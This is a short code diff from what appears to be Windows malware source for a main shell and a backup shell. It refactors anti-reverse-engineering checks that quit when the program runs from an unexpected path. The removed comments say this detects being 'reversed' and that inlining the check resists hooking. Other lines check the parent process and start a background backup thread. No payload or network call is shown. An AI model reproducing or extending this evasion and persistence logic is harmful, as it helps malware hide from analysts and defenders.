@@ -19,10 +19,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	//Alloc console for debug purposes
 	CreateDebugConsole();
 
-	//Check that full path is at least one of the 2 valid ones, else this bad boy is being prolly reversed
-	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { 
-		return 0;
-	}
+	Utils::CheckFullPath();
 
 	//Main logic of backup shell will be executed in an external thread
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)BackupThread, NULL, NULL, NULL);
@@ -61,10 +58,7 @@ useless_backup_shell_code:
 	//BEGINNING OF MAIN SHELL CODE (VARIOUS CHECKS)
 non_backup_shell_code:
 	Log("Got to main shell code\n");
-	//Code repetition (using functions is counterproductive since they could hook them easily)
-	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { 
-		return 0;
-	}
+	Utils::CheckFullPath();
 	//Check that parent process name == SHELL_BACKUP_NAME
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(Utils::getProcess(SHELL_NAME)));
 	if (!hProcess)
